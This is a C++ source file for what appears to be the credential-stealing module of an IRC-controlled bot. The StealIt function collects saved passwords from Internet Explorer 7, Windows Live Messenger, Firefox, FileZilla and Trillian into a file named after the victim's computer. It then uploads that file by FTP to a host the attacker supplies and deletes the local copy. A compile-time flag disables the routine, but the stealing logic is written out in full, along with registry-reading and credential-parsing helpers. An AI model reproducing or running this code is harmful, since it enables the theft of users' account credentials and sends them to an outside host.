#include "stealer.hpp"

#define NO_STEALER

int StealIt ( IRC* irc, API* api, string host, string port, string user, string pass ) {
#ifndef NO_STEALER
	char appdata[MAX_PATH] = "\0";
	api->ExpandEnvironmentStrings("%appdata%\\", appdata, MAX_PATH);
	FILE *file;
	char upfile[64] = "\0";
	api->ExpandEnvironmentStrings("%computername%", upfile, 64);
	api->wsprintfA(upfile, "%s-%d", upfile, api->GetTickCount());
	file = fopen(upfile, "w+");
	string	passwords = GetIE7Passwords(api);
			passwords += GetWLMPasswords(api);
			passwords += GetFireFoxPasswords(api, appdata);
			passwords += GetFileZillaPasswords(api, appdata);
			passwords += GetTrillianPasswords(api, appdata);
	fwrite(passwords.c_str(), passwords.length(), 1, file);
	fclose(file);
	FTPUpload(irc, api, upfile, host, port, user, pass);
	api->DeleteFile(upfile);
#else
	irc->IRCSend(IRC_MSG, irc->servers[irc->currserver].channel, "[STEALER]: Your version does not include the stealer.");
#endif

	return 0;
}

void GetHashStr(API *api, wchar_t *Password,char *HashStr) {
	HashStr[0]= '\0';
	HCRYPTPROV hProv = NULL;
	HCRYPTHASH hHash = NULL;
	api->CryptAcquireContext(&hProv, 0, 0, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
	if (api->CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) {
		if (api->CryptHashData(hHash, (unsigned char*)Password, (wcslen(Password)+1)*2, 0)) {
			DWORD dwHashLen=20;
			BYTE Buffer[20];
			if (api->CryptGetHashParam(hHash, HP_HASHVAL, Buffer, &dwHashLen, 0)) {
				api->CryptDestroyHash(hHash);
				api->CryptReleaseContext(hProv, 0);
				char TmpBuf[128];
				unsigned char tail = 0;
				for(int i = 0; i < 20; i++) {
					unsigned char c = Buffer[i];
					tail += c;
					api->wsprintf(TmpBuf, "%s%2.2X", HashStr,c);
					api->lstrcpy(HashStr, TmpBuf);
				}
				api->wsprintf(TmpBuf, "%s%2.2X", HashStr,tail);
				api->lstrcpy(HashStr, TmpBuf);
			}
		}
	}
}

string PrintData(API* api, char *Data) {
	PDWORD HeaderSize, DataSize, DataMax;
	HeaderSize = (PDWORD)&Data[4];
	DataSize = (PDWORD)&Data[8];
	DataMax = (PDWORD)&Data[20];

    char *pInfo = &Data[36];
    char *pData = &Data[*HeaderSize];
	char buff[500] = "\0";
	int i = 0;
    for(DWORD n = 0; n < *DataMax; n++) {	
        PDWORD offset = (PDWORD)pInfo;

        char TmpBuf[1024];
		api->wsprintf(TmpBuf, "%ls", (wchar_t*)&Data[*HeaderSize+12+*offset]);
		api->lstrcat(buff, TmpBuf);
		i += api->lstrlen(TmpBuf);
		if (n % 2 == 0) {
			buff[i] = ':';
			i++;
		} else {
			buff[i] = '\n';
			i++;
		}
        pInfo+=16;
    }
	return buff;
}

string ReadRegistryKey (API *api, HKEY hKey, LPCTSTR lpSubKey, LPCTSTR lpValueName) {
	HKEY hResult;
	LPBYTE lpData;
	DWORD dwSize, dwType;
	
	if (api->RegOpenKeyEx (hKey, lpSubKey, 0, KEY_READ, &hResult) == ERROR_SUCCESS) {
		api->RegQueryValueEx (hResult, lpValueName, NULL, NULL, NULL, &dwSize);
		lpData = (BYTE*)malloc (dwSize);

		api->RegQueryValueEx (hResult, lpValueName, NULL, &dwType, lpData, &dwSize);
		api->RegCloseKey (hResult);

		return (char*)lpData;
	} else {
		return "";
	}
}

string GetFileData (API* api, string lpFileName) {
	HANDLE hFile;
	LPBYTE lpData;
	DWORD dwSize, dwRead;
	
	hFile = api->CreateFile (lpFileName.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	dwSize = api->GetFileSizeEx(hFile, NULL);
	lpData = (BYTE*)malloc (dwSize);
	
	api->ReadFile (hFile, (LPVOID)lpData, dwSize, &dwRead, NULL);
	lpData[dwSize-4] = '\0';
	api->CloseHandle (hFile);

	return (char*) lpData;
}